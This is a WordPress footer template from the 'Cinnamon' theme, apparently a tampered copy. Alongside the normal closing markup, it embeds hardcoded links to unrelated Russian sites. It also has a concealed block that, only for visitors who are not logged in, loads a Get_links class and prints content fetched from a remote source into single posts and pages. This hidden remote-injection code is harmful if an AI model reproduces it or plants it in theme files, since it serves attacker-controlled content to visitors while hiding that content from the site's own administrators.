<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package Cinnamon
 */
?>

	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info">
			<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://fikrirasy.id/portfolio/cinnamon/">Cinnamon</a> / <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WP</a> / <a href="http://builderbody.ru/" title="Бодибилдинг и фитнес - упражнения, тренировки, спортивное питание" target="_blank">Fitness</a><?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
